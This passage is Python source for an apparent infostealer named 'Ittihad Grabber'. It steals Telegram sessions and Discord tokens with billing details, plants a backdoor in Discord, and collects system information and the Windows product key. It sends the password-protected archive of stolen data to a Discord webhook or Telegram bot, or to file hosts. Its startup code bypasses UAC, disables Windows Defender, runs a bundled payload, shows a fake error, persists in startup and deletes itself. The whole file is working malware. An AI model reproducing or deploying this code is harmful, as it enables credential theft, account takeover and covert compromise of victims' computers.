                    telegramPaths.append(os.path.join(os.getenv('appdata'), 'Telegram Desktop'))
                for index, telegramPath in enumerate(telegramPaths):
                    tDataPath = os.path.join(telegramPath, 'tdata')
                    loginPaths = []
                    files = []
                    dirs = []
                    has_key_datas = False
                    if os.path.isdir(tDataPath):
                        for item in os.listdir(tDataPath):
                            itempath = os.path.join(tDataPath, item)
                            if item == 'key_datas':
                                has_key_datas = True
                                loginPaths.append(itempath)
                            if os.path.isfile(itempath):
                                files.append(item)
                            else:
                                dirs.append(item)
                        for filename in files:
                            for dirname in dirs:
                                if dirname + 's' == filename:
                                    loginPaths.extend([os.path.join(tDataPath, x) for x in (filename, dirname)])
                    if has_key_datas and len(loginPaths) - 1 > 0:
                        _saveToDir = saveToDir
                        if multiple:
                            _saveToDir = os.path.join(_saveToDir, 'Profile %d' % (index + 1))
                        os.makedirs(_saveToDir, exist_ok=True)
                        failed = False
                        for loginPath in loginPaths:
                            try:
                                if os.path.isfile(loginPath):
                                    shutil.copy(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)))
                                else:
                                    shutil.copytree(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)), dirs_exist_ok=True)
                            except Exception:
                                try:
                                    shutil.rmtree(_saveToDir)
                                except Exception:
                                    pass
                                failed = True
                                break
                        if not failed:
                            self.TelegramSessionsCount += int((len(loginPaths) - 1) / 2)
                if self.TelegramSessionsCount and multiple:
                    with open(os.path.join(saveToDir, 'Info.txt'), 'w') as file:
                        file.write('Multiple Telegram installations are found, so the files for each of them are put in different Profiles')
            except Exception:
                pass

    @Errors.Catch
    def StealDiscordTokens(self) -> None:
        if Settings.CaptureDiscordTokens:
            Logger.info('Stealing discord tokens')
            output = list()
            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Discord')
            try:
                accounts = Discord.GetTokens()
                if accounts:
                    for item in accounts:
                        USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = item.values()
                        output.append('Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}'.format(USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
                    os.makedirs(os.path.join(self.TempFolder, 'Messenger', 'Discord'), exist_ok=True)
                    with open(os.path.join(saveToDir, 'Discord Tokens.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                        file.write(self.Separator.lstrip() + self.Separator.join(output))
                    self.DiscordTokensCount += len(accounts)
            except Exception:
                pass
        if Settings.DiscordInjection and (not Utility.IsInStartup()):
            try:
                paths = Discord.InjectJs()
                if paths is not None:
                    Logger.info('Injecting backdoor into discord')
                    for dir in paths:
                        appname = os.path.basename(dir)
                        Utility.TaskKill(appname)
                        for root, _, files in os.walk(dir):
                            for file in files:
                                if file.lower() == appname.lower() + '.exe':
                                    time.sleep(3)
                                    filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
                                    UpdateEXE = os.path.join(dir, 'Update.exe')
                                    DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                                    subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            except Exception:
                pass

    def CreateArchive(self) -> tuple[str, str]:
        Logger.info('Creating archive')
        try:
            rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
            if Utility.GetSelf()[1] or os.path.isfile(rarPath):
                rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
                if os.path.isfile(rarPath):
                    password = Settings.ArchivePassword or 'ittihad123'
                    process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath), capture_output=True, shell=True, cwd=self.TempFolder)
                    if process.returncode == 0:
                        return 'rar'
        except Exception:
            pass
        shutil.make_archive(self.ArchivePath.rsplit('.', 1)[0], 'zip', self.TempFolder)
        return 'zip'

    def UploadToExternalService(self, path, filename=None) -> str | None:
        if os.path.isfile(path):
            Logger.info('Uploading %s to gofile' % (filename or 'file'))
            with open(path, 'rb') as file:
                fileBytes = file.read()
            if filename is None:
                filename = os.path.basename(path)
            http = PoolManager(cert_reqs='CERT_NONE')
            try:
                server = json.loads(http.request('GET', 'https://api.gofile.io/getServer').data.decode(errors='ignore'))['data']['server']
                if server:
                    url = json.loads(http.request('POST', 'https://{}.gofile.io/uploadFile'.format(server), fields={'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['downloadPage']
                    if url:
                        return url
            except Exception:
                try:
                    Logger.error('Failed to upload to gofile, trying to upload to anonfiles')
                    url = json.loads(http.request('POST', 'https://api.anonfiles.com/upload', fields={'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['file']['url']['short']
                    return url
                except Exception:
                    Logger.error('Failed to upload to anonfiles')
                    return None

    def SendData(self) -> None:
        Logger.info('Sending data to C2')
        extention = self.CreateArchive()
        if not os.path.isfile(self.ArchivePath):
            raise FileNotFoundError('Failed to create archive')
        filename = 'Ittihad-%s.%s' % (os.getlogin(), extention)
        computerName = os.getenv('computername') or 'Unable to get computer name'
        try:
            computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
            computerOS = computerOS[2].strip() if len(computerOS) >= 2 else 'Unable to detect OS'
        except Exception:
            computerOS = 'Unable to detect OS'
        try:
            totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
            totalMemory = str(int(int(totalMemory[1]) / 1000000000)) + ' GB' if len(totalMemory) >= 1 else 'Unable to detect total memory'
        except Exception:
            totalMemory = 'Unable to detect total memory'
        try:
            uuid = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
            uuid = uuid[1].strip() if len(uuid) >= 1 else 'Unable to detect UUID'
        except Exception:
            uuid = 'Unable to detect UUID'
        try:
            cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to detect CPU'
        except Exception:
            cpu = 'Unable to detect CPU'
        try:
            gpu = subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
            gpu = gpu[2].strip() if len(gpu) >= 2 else 'Unable to detect GPU'
        except Exception:
            gpu = 'Unable to detect GPU'
        try:
            productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to get product key'
        except Exception:
            productKey = 'Unable to get product key'
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
            if r.get('status') != 'success':
                raise Exception('Failed')
            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
            if len(r['reverse']) != 0:
                data += f"\nReverse DNS: {r['reverse']}"
        except Exception:
            ipinfo = '(Unable to get IP info)'
        else:
            ipinfo = data
        system_info = f'Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}'
        collection = {'Discord Accounts': self.DiscordTokensCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'History': self.HistoryCount, 'Autofills': self.AutofillCount, 'Roblox Cookies': self.RobloxCookiesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Common Files': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount, 'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No', 'Screenshot': 'Yes' if self.ScreenshotTaken else 'No', 'System Info': 'Yes' if self.SystemInfoStolen else 'No'}
        grabbedInfo = '\n'.join([key + ' : ' + str(value) for key, value in collection.items()])
        match Settings.C2[0]:
            case 0:
                image_url = 'https://raw.githubusercontent.com/ittihad-c/ittihad-Grabber/main/.github/workflows/image.png'
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Ittihad Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/zlmoka', 'color': 34303, 'footer': {'text': 'Grabbed by Ittihad Grabber | YouTube : @Zlmokah & https://t.me/hostcost'}, 'thumbnail': {'url': image_url}}], 'username': 'Ittihad Grabber', 'avatar_url': image_url}
                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception('Failed to upload to external service')
                else:
                    url = None
                fields = dict()
                if url:
                    payload['content'] += ' | Archive : %s' % url
                else:
                    fields['file'] = (filename, open(self.ArchivePath, 'rb').read())
                fields['payload_json'] = json.dumps(payload).encode()
                http.request('POST', Settings.C2[1], fields=fields)
            case 1:
                payload = {'caption': f'<b>ittihad Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception('Failed to upload to external service')
                else:
                    url = None
                fields = dict()
                if url:
                    payload['text'] = payload['caption'] + '\n\nArchive : %s' % url
                    method = 'sendMessage'
                else:
                    fields['document'] = (filename, open(self.ArchivePath, 'rb').read())
                    method = 'sendDocument'
                token, chat_id = Settings.C2[1].split('$')
                fields.update(payload)
                fields.update({'chat_id': chat_id})
                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)

if os.name == 'nt':
    Logger.info('Process started')
    if Settings.HideConsole:
        Syscalls.HideConsole()

    is_admin = Utility.IsAdmin()
    if not is_admin:
        Logger.warning('Admin privileges not available')

    if Utility.GetSelf()[1]:
        if not is_admin:
            if Settings.UacBypass and '--nouacbypass' not in sys.argv:
                Logger.info('Trying to bypass UAC (Application will restart)')
                if Utility.UACbypass():
                    os._exit(0)
            if not Utility.IsAdmin():
                Logger.info('Showing UAC prompt to user (Application will restart)')
                if Utility.UACPrompt(sys.executable):
                    os._exit(0)

    is_admin = Utility.IsAdmin()
    if not is_admin:
        Logger.info('Running without admin privileges (continuing anyway)')

    if not Syscalls.IsVCRedistInstalled():
        Logger.info('VC++ Redistributable not found, trying to install')
        Syscalls.InstallVCRedist()

    Logger.info('Trying to create mutex')
    if not Syscalls.CreateMutex(Settings.Mutex):
        Logger.info('Mutex already exists, waiting 5 seconds then retrying')
        Syscalls.ReleaseMutex(Settings.Mutex)
        time.sleep(5)
        if not Syscalls.CreateMutex(Settings.Mutex):
            Logger.info('Mutex still exists, exiting')
            os._exit(0)

    if Utility.GetSelf()[1]:
        Logger.info('Trying to exclude the file from Windows defender')
        Utility.ExcludeFromDefender()
    Logger.info('Trying to disable defender')
    Utility.DisableDefender()

    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.ittihad'))):
        try:
            Logger.info('Trying to extract bound file')
            if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):
                Logger.info('Old bound file found, removing it')
                os.remove(boundFileDst)
            with open(boundFileSrc, 'rb') as file:
                content = file.read()
            decrypted = zlib.decompress(content[::-1])
            with open(boundFileDst, 'wb') as file:
                file.write(decrypted)
            del content, decrypted
            Logger.info('Trying to exclude bound file from defender')
            Utility.ExcludeFromDefender(boundFileDst)
            Logger.info('Starting bound file')
            subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)

    if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):
        try:
            Logger.info('Showing fake error popup')
            title = Settings.FakeError[1][0].replace('"', '\\x22').replace("'", '\\x22')
            message = Settings.FakeError[1][1].replace('"', '\\x22').replace("'", '\\x22')
            cmd = 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'{}\', 0, \'{}\', {}+16);close()"'.format(message, title, Settings.FakeError[1][2])
            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)

    if Utility.GetSelf()[1]:
        if Settings.Melt and (not Utility.IsInStartup()):
            Logger.info('Hiding the file')
            Utility.HideSelf()
    elif Settings.Melt:
        Logger.info('Deleting the file')
        Utility.DeleteSelf()

    try:
        if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
            Logger.info('Trying to put the file in startup')
            path = Utility.PutInStartup()
            if path is not None:
                Logger.info('Excluding the file from Windows defender in startup')
                Utility.ExcludeFromDefender(path)
    except Exception:
        Logger.error('Failed to put the file in startup')

    retry_count = 0
    while True:
        try:
            Logger.info('Checking internet connection')
            if Utility.IsConnectedToInternet():
                Logger.info('Internet connection available, starting stealer')
                ittihadGrabber()
                Logger.info('Stealer finished its work')
                break
            else:
                retry_count += 1
                Logger.info(f'No internet, retry {retry_count}/30 in 10 seconds')
                if retry_count >= 30:
                    Logger.info('Too many retries, exiting')
                    break
                time.sleep(10)
        except Exception as e:
            if isinstance(e, KeyboardInterrupt):
                os._exit(1)
            Logger.critical(e, exc_info=True)
            Logger.info('Error occurred, retrying after 60 seconds')
            time.sleep(60)

    if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
        Logger.info('Deleting the file')
        Utility.DeleteSelf()
    Logger.info('Process ended')